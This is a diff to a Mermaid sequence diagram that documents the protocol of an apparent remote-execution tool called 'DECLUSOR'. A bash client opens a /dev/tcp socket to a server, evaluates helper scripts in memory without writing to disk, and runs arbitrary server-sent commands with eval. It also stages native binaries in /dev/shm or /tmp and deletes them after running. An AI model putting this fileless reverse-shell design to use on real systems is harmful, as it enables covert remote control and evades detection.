@@ -23,23 +23,23 @@ sequenceDiagram
     participant Bash as Client Execution Loop
 
     Note over Server,Bash: Handshake & Helper Injection
-    Server->>FD3: Connect TCP Socket
+    Server->>FD3: Connect TCP Socket (exec 3<>/dev/tcp/... || exit 1)
     Server->>FD3: Nonce H0 + \x00 + Helper Bundle (util.sh, file.sh) + \x00
-    Bash->>Bash: eval helpers in-memory (no disk write)
-    Bash->>FD3: printf '__DECLUSOR_EOF_%s__\n' "$nonce" >&3
+    Bash->>Bash: eval helpers in-memory (stdin isolated via </dev/null)
+    Bash->>FD3: printf '__DECLUSOR_EOF_%s__\n' "$nonce"
     Server-->>Server: Verify __DECLUSOR_EOF_H0__, Handshake Complete (State: CONNECTED)
 
     loop Command Dispatch Loop
         Server->>FD3: Nonce N_i + \x00 + Command Payload + \x00
-        Bash->>Bash: Read null-delimited nonce and data
+        Bash->>Bash: Read null-delimited nonce and data (read -u 3)
         alt In-Memory Shell Command / Script
-            Bash->>FD3: eval "$data" >&3 2>&3
+            Bash->>FD3: eval "$data" </dev/null (streamed via >&3 2>&1)
         else Native Binary Execution
             Bash->>Bash: Stage to writable exec path (/dev/shm -> /tmp -> /var/tmp)
-            Bash->>FD3: Execute & stream output to >&3 2>&3
+            Bash->>FD3: Execute & stream output (via >&3 2>&1)
             Bash->>Bash: Unlink binary
         end
-        Bash->>FD3: printf '__DECLUSOR_EOF_%s__\n' "$nonce" >&3
+        Bash->>FD3: printf '__DECLUSOR_EOF_%s__\n' "$nonce"
         Server-->>Server: Detect __DECLUSOR_EOF_N_i__, yield chunks to REPL
     end
 ```
